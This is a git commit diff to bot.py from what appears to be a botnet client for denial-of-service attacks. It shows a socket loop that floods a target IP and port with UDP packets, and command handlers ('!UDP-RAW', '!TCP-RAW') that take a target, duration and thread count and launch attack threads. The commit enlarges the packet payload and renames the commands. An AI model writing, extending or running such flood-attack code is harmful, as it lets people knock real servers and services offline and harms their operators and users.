22ca494867e593f8ecebccace96a8bd7df6e6e4f
Bss Development Store <157105843+BssStore@users.noreply.github.com>
2024-05-12 15:43:24 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -80,7 +80,7 @@ def attack_pps(ip, port, end_time, size):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             dport = random.randint(1, 65535) if port == 0 else port
-            data = b' ' * 64  
+            data = b' ' * 124  
             while time.time() < end_time:
                 s.sendto(data, (ip, dport))
         except Exception as e:
@@ -180,7 +180,7 @@ def main():
                 args = data.split(' ')
                 command = args[0].upper()
 
-                if command == '!UDP':
+                if command == '!UDP-RAW':
                     ip = args[1]
                     port = int(args[2])
                     duration = int(args[3])
@@ -190,7 +190,7 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!TCP':
+                if command == '!TCP-RAW':
                     ip = args[1]
                     port = int(args[2])
                     duration = int(args[3])
